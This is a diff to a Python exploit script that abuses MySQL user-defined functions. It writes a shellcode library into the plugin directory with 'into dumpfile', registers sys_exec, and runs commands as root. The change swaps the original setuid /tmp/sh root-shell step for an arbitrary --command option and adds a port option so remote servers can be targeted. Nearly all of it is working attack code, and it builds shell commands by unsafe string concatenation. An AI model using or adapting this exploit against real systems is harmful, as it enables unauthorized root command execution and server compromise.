@@ -26,6 +26,10 @@ Tested on 3.16.0-6-amd64 #1 SMP Debian 3.16.57-2 (2018-07-14) x86_64 GNU/Linux
 @d7x_real
 https://d7x.promiselabs.net
 https://www.promiselabs.net
+
+@Pheelbert
+Modified the code slightly so that it can be used to exploit remote mysql servers
+TODO: Add x32/x64 arch in paramters
 '''
 
 
@@ -44,31 +48,21 @@ shellcode = shellcode_x32
 if (platform.architecture()[0] == '64bit'):
  shellcode = shellcode_x64
 
-# MySQL username and password: make sure you have FILE privileges and mysql is actually running as root
-# username='root'
-# password=''
-
-###
-#if len(sys.argv) != 2:
-#	print "Usage: %s <username> <password>" % argv[0]
-
-#username=sys.argv[1];
-#password=sys.argv[2];
-###
-
 parser = argparse.ArgumentParser()
 parser.add_argument('--username', '-u', help='MySQL username', type=str, required=True)
 parser.add_argument('--password', '-p', help='MySQL password', type=str)
+parser.add_argument('--command', '-c', help='Command ran as root', type=str)
+parser.add_argument('--port', help='MySQL port', type=str, default='3306')
 
 args = parser.parse_args()
 
 username=args.username
-password=args.password	
+password=args.password
 
 if not password:
-	password=''
-	
-cmd='mysql -u root -p\'' + password + '\' -e "select @@plugin_dir \G"'
+        password=''
+
+cmd='mysql --port ' + args.port + ' -u ' + username + ' -p\'' + password + '\' -e "select @@plugin_dir \G"'
 plugin_str = subprocess.check_output(cmd, shell=True)
 plugin_dir = re.search('@plugin_dir: (\S*)', plugin_str)
 res = bool(plugin_dir)
@@ -76,7 +70,7 @@ res = bool(plugin_dir)
 if not res:
  print "Error: could not locate the plugin directory"
  os.exit(1);
-	
+
 plugin_dir_ = plugin_dir.group(1)
 
 print "Plugin dir is %s" % plugin_dir_
@@ -89,28 +83,24 @@ udf_outfile = plugin_dir_ + udf_filename
 # set @outputpath := @@plugin_dir; select concat...;
 
 print "Trying to create a udf library...";
-os.system('mysql -u root -p\'' + password + '\' -e "select binary 0x' + shellcode + ' into dumpfile \'%s\' \G"' % udf_outfile)
+os.system('mysql --port ' + args.port + ' -u ' + username + ' -p\'' + password + '\' -e "select binary 0x' + shellcode + ' into dumpfile \'%s\' \G"' % udf_outfile)
 res = os.path.isfile(udf_outfile)
 
 if not res:
- print "Error: could not create udf file in %s (mysql is either not running as root or may be file exists?)" % udf_outfile
- os.exit(1);
+ print "Error: could not verify that udf file in %s (mysql is either not running as root or may be file exists?)" % udf_outfile
 
 print "UDF library crated successfully: %s" % udf_outfile;
 print "Trying to create sys_exec..."
-os.system('mysql -u root -p\'' + password + '\' -e "create function sys_exec returns int soname \'%s\'\G"' % udf_filename)
+os.system('mysql --port ' + args.port + ' -u ' + username + ' -p\'' + password + '\' -e "create function sys_exec returns int soname \'%s\'\G"' % udf_filename)
 
 print "Checking if sys_exec was crated..."
-cmd='mysql -u root -p\'' + password + '\' -e "select * from mysql.func where name=\'sys_exec\' \G"';
+cmd='mysql --port ' + args.port + ' -u ' + username + ' -p\'' + password + '\' -e "select * from mysql.func where name=\'sys_exec\' \G"';
 res = subprocess.check_output(cmd, shell=True);
 
 if (res == ''):
-	print "sys_exec was not found (good luck next time!)"
+        print "sys_exec was not found (good luck next time!)"
 
 if res:
-	print "sys_exec was found: %s" % res
-	print "Generating a suid binary in /tmp/sh..."
-	os.system('mysql -u root -p\'' + password + '\' -e "select sys_exec(\'cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh\')"')
-	
-	print "Trying to spawn a root shell..."
-	pty.spawn("/tmp/sh");
+        print "sys_exec was found: %s" % res
+        print "Running provided shell command..."
+        os.system('mysql --port ' + args.port + ' -u ' + username + ' -p\'' + password + '\' -e "select sys_exec(\'' + args.command + '\')"')
